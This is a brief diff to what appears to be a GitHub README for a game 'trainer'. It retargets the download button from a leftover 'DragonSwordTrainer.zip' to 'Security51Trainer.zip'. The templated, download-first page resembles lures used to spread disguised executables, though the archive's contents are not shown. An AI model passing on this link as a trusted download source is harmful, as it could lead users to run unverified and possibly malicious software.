@@ -12,7 +12,7 @@
 > **[⬇ Download the latest Security 51 trainer](https://github.com/RapidsLordConnector/Security-51-Trainer/releases/latest)**
 
 <p align="center">
-    <a href="https://github.com/RapidsLordConnector/Security-51-Trainer/releases/latest/download/DragonSwordTrainer.zip">
+    <a href="https://github.com/RapidsLordConnector/Security-51-Trainer/releases/latest/download/Security51Trainer.zip">
         <img src="assets/example.png" width="100%" alt="Download Security 51 Trainer">
     </a>
 </p>
